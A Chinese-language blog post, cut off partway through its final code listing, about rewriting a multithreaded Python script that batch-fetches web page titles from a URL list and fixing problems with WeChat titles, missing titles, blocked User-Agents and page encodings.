<h1 id="0x01-版本对比"><a href="#0x01-版本对比" class="headerlink" title="0x01 版本对比"></a>0x01 版本对比</h1><p>早期版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTitle</span>(<span class="params">line</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        line=line.strip()</span><br><span class="line">        re = requests.get(line, timeout=<span class="number">2</span>)</span><br><span class="line">        ret2.write(line + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> line+<span class="string">&#x27;\t\t&#x27;</span>+<span class="built_in">str</span>(re.status_code)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.status_code==<span class="number">200</span>:</span><br><span class="line">            text=BeautifulSoup(re.content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            titles=text.find(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">            title=<span class="built_in">str</span>(titles)</span><br><span class="line">            ret.write(line+<span class="string">&#x27;\t\t&#x27;</span>+title+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret.write(line + <span class="string">&#x27;\t\t&#x27;</span> + <span class="string">&#x27;Error Code:&#x27;</span> + re.status_code + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        ret2.write(line + <span class="string">&#x27;\terror\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> line+<span class="string">&#x27;\t\ttime out&#x27;</span></span><br><span class="line">        ret.write(line+<span class="string">&#x27;\t\t&#x27;</span>+ <span class="string">&#x27;Time out\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Worker</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, taskQueue</span>):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        self.taskQueue = taskQueue</span><br><span class="line">        self.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">callable</span>, args, kwds = self.taskQueue.get(block=<span class="literal">False</span>)</span><br><span class="line">                <span class="built_in">callable</span>(*args, **kwds)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadPool</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.threads = []</span><br><span class="line">        self.taskQueue = Queue()</span><br><span class="line">        self.threadNum = num_thread</span><br><span class="line">        self.__create_taskqueue()</span><br><span class="line">        self.__create_threadpool(self.threadNum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__create_taskqueue</span>(<span class="params">self</span>):</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;target.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            self.add_task(getTitle, line)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__create_threadpool</span>(<span class="params">self, threadNum</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threadNum):</span><br><span class="line">            thread = Worker(self.taskQueue)</span><br><span class="line">            self.threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_task</span>(<span class="params">self, <span class="built_in">callable</span>, *args, **kwds</span>):</span><br><span class="line">        self.taskQueue.put((<span class="built_in">callable</span>, args, kwds))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_complete</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            alive = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_thread):</span><br><span class="line">                alive = alive <span class="keyword">or</span> self.threads[i].isAlive()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> alive:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signum, frame</span>):</span><br><span class="line">    <span class="keyword">global</span> is_exit</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;CTRL+C Is Pressed&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num_thread = <span class="number">20</span></span><br><span class="line">    signal.signal(signal.SIGINT, handler)</span><br><span class="line">    signal.signal(signal.SIGTERM, handler)</span><br><span class="line">    ret = <span class="built_in">open</span>(<span class="string">&quot;titles.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    ret2=<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    tp = ThreadPool()</span><br><span class="line">    tp.new_complete()</span><br><span class="line">    ret.close()</span><br><span class="line">    ret2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重写极简版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">res=requests.get(url)</span><br><span class="line">soup=BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(soup.title.string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> signal, SIGINT</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:10809&#x27;</span>&#125;</span><br><span class="line">threads=<span class="number">30</span></span><br><span class="line">timeout=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signal_received, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;SIGINT or CTRL-C detected. Exiting gracefully&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_urllist</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> target:</span><br><span class="line">        targets=target.readlines()</span><br><span class="line">        <span class="keyword">return</span> targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">url</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Timeout&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> res.apparent_encoding != <span class="literal">None</span>:</span><br><span class="line">        response=res.content.decode(res.apparent_encoding)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response=res.text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;mp.weixin.qq.com&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">            rule=<span class="string">r&quot;var msg_title = &#x27;.*&#x27;&quot;</span></span><br><span class="line">            title=re.search(<span class="string">r&quot;&#x27;.*&#x27;&quot;</span>,re.search(rule,response).group()).group().strip(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            soup=BeautifulSoup(response,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> soup.title:</span><br><span class="line">                title=<span class="built_in">str</span>(soup.title.string)</span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                title=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">single_thread</span>(<span class="params">url</span>):</span><br><span class="line">    url=url.strip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    result=url + <span class="string">&#x27;\t&#x27;</span> + <span class="built_in">str</span>(get_title(url))</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output:</span><br><span class="line">        output.write(result+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    signal(SIGINT, handler)</span><br><span class="line">    target=get_urllist(<span class="string">&#x27;target.txt&#x27;</span>)</span><br><span class="line">    pool = threadpool.ThreadPool(threads)</span><br><span class="line">    threading=threadpool.makeRequests(single_thread,target)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> threading]</span><br><span class="line">    pool.wait()</span><br></pre></td></tr></table></figure>

<p>简而言之，早期的版本与当前版本区别如下：</p>
<ul>
<li>利用多线程的方式有所区别</li>
<li>解决了不同网页编码格式不同的问题</li>
<li>增加了代理选项</li>
<li>解决了微信公众还title爬取不到的问题</li>
<li>解决一些其他的小BUG</li>
<li>一些使用体验上的优化</li>
</ul>
<h1 id="0x02-探索历程"><a href="#0x02-探索历程" class="headerlink" title="0x02 探索历程"></a>0x02 探索历程</h1><p>早期的版本实际上是直接对其他大佬的代码做的修改，仅仅在使用习惯上做了一些调整，代码逻辑也不甚了解，于是一不做二不休，从零开始重写脚本。</p>
<h2 id="坑1-微信公众号文章的Title"><a href="#坑1-微信公众号文章的Title" class="headerlink" title="坑1 微信公众号文章的Title"></a>坑1 微信公众号文章的Title</h2><p>最早用极简版测试的时候，发现所有的微信公众号都无法用bs4直接获取到title，于是乎瞅了一眼公众号的源码，title竟然是这个屌样子的……</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    …………</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> hd_head_img = <span class="string">&quot;http://xxxxxxxxxx/&quot;</span>||<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ori_head_img_url = <span class="string">&quot;http://xxxxxxxxx/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> msg_title = <span class="string">&#x27;这里是title&#x27;</span>.<span class="title function_">html</span>(<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> msg_desc = <span class="string">&quot;XXXXXXXXXX...&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> msg_cdn_url = <span class="string">&quot;http://XXXXXX/...&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    …………</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>丧心病狂啊……这操作我没太看明白，防爬？</p>
<p>想多了吧。</p>
<p>直接正则一把梭：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;mp.weixin.qq.com&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">    rule=<span class="string">r&quot;var msg_title = &#x27;.*&#x27;&quot;</span></span><br><span class="line">    title=re.search(<span class="string">r&quot;&#x27;.*&#x27;&quot;</span>,re.search(rule,response).group()).group().strip(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="坑2-没有Title"><a href="#坑2-没有Title" class="headerlink" title="坑2 没有Title"></a>坑2 没有Title</h2><p>有些链接是文件的下载链接，没有Title，于是引发bs4报错，于是引发脚本崩溃，这……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">soup=BeautifulSoup(response,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> soup.title:</span><br><span class="line">    title=<span class="built_in">str</span>(soup.title.string)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    title=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="坑3-User-Agent被拦截"><a href="#坑3-User-Agent被拦截" class="headerlink" title="坑3 User-Agent被拦截"></a>坑3 User-Agent被拦截</h2><p>有的防护设备居然会丧心病狂的拦截requests的UA……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Timeout&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="坑4-编码问题"><a href="#坑4-编码问题" class="headerlink" title="坑4 编码问题"></a>坑4 编码问题</h2><p>这其实是个挺头疼的问题，之前第一版的脚本就一直没有解决。<br>以前读取<code>response</code>的内容，一般是通过两个方式，<code>res.text()</code>或者<code>res.content()</code>。但是这样有一个很头疼的问题，就是每个网站的编码方式不一样，尤其中文网站，用<code>GBK</code>的和用<code>UTF-8</code>的网站几乎一样多。于是输出的时候就是各种乱七八糟的乱码，而一个文件又不可能同时有两种编码格式。<br>经过艰(qing)难(jiao)研(da)究(lao)，最终确定了两种解决方案：</p>
<ol>
<li>通过<code>chardet</code>确定编码格式，最终统一成同一种编码方式；</li>
<li>读取网页<code>response</code>头中的编码格式，然后decode；</li>
</ol>
<p>最终我采用的是方案2：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = res.content.decode(res.apparent_encoding)</span><br></pre></td></tr></table></figure>

<p>这里又有一个小坑，有些网站的response头中不会返回编码格式……</p>
<p>这类网站往往都是默认采用<code>UTF-8</code>格式编码，所以我们直接用<code>res.text</code>就可以了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> res.apparent_encoding != <span class="literal">None</span>:</span><br><span class="line">    response=res.content.decode(res.apparent_encoding)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    response=res.text</span><br></pre></td></tr></table></figure>

<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这次脚本的编写还算比较顺利（毕竟是个很简单的东西），从开始到调试、完工也不过花了两个多小时，还不如写这篇文章花的时间多，大部分时间都花在了滤坑上面。但是其实还是可以分析出一些东西，一是本人确实久疏战阵，不太熟练了；二来，即便比早先的版本改进了一些，但距离作为一个成熟的工具，仍有许多可以改进的地方。</p>
<h2 id="仍然存在的缺陷"><a href="#仍然存在的缺陷" class="headerlink" title="仍然存在的缺陷"></a>仍然存在的缺陷</h2><ol>
<li>遭遇某些编码格式的网站时，仍然会报错（如<code>cp1254</code>等）；</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;.\get-title.py&quot;</span>, line <span class="number">28</span>, <span class="keyword">in</span> get_title</span><br><span class="line">  response=res.content.decode(res.apparent_encoding)</span><br><span class="line">File <span class="string">&quot;C:\Environment\Python38\lib\encodings\cp1254.py&quot;</span>, line <span class="number">15</span>, <span class="keyword">in</span> decode</span><br><span class="line">  <span class="keyword">return</span> codecs.charmap_decode(<span class="built_in">input</span>,errors,decoding_table)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>对于一些比较常见的反爬虫手段，无能为力（爬到的title是<code>Just a moment...</code>，说明在自动验证是否真人访问）</li>
</ol>
<h2 id="可以改进的方向"><a href="#可以改进的方向" class="headerlink" title="可以改进的方向"></a>可以改进的方向</h2><ol>
<li>增加代理池模式，用以解决部分网站TimeOut的问题；</li>
<li>更加友好的结果呈现，可输出至Excel表格中，最好舍弃csv采用xlsx，因为获取的title千奇百怪，可能破坏csv的格式；</li>
<li>自动识别一些常见的中间件，如Weblogic等等；</li>
</ol>
<h1 id="0x04-2021-2-26更新"><a href="#0x04-2021-2-26更新" class="headerlink" title="0x04 2021.2.26更新"></a>0x04 2021.2.26更新</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> signal, SIGINT</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">use_proxy=<span class="literal">True</span></span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:10809&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:10809&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># proxies=&#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:10809&#x27;&#125;</span></span><br><span class="line">threads=<span class="number">30</span></span><br><span class="line">timeout=<span class="number">10</span></span><br><span class="line">result_encode_type=<span class="string">&#x27;gb18030&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signal_received, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;SIGINT or CTRL-C detected. Exiting gracefully&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_urllist</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> target:</span><br><span class="line">        targets=target.readlines()</span><br><span class="line">        <span class="keyword">return</span> targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line">    headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> use_proxy:</span><br><span class="line">            res = requests.get(url,headers=headers,proxies=proxies,timeout=timeout)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Timeout&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> res.apparent_encoding != <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            encode_type=res.apparent_encoding</span><br><span class="line">            response=res.content.decode(encode_type)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;#Warning# Can&#x27;t decode string as 【%s】.Target URL is 【%s】.&quot;</span> % (res.apparent_encoding,url))</span><br><span class="line">            response=res.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response=res.text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;mp.weixin.qq.com&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">            rule=<span class="string">r&quot;var msg_title = &#x27;.*&#x27;&quot;</span></span><br><span class="line">            title=re.search(<span class="string">r&quot;&#x27;.*&#x27;&quot;</span>,re.search(rule,response).group()).group().strip(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            soup=BeautifulSoup(response,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> soup.title:</span><br><span class="line">                title=<span class="built_in">str</span>(soup.title.string)</span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                title=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> 